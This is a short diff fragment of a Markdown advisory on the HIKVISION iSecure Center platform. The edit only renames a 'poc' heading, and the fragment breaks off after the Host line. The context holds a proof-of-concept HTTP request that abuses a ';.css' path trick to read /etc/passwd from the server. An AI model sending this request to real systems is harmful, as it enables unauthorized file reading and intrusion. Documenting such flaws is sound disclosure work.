@@ -9,7 +9,7 @@ HIKVISION iSecure Center综合安防管理平台是一套“集成化”、“�
 综合安防管理平台
 ```
 
-## poc
+## POC
 ```
 GET /lm/api/files;.css?link=/etc/passwd HTTP/1.1
 Host: 
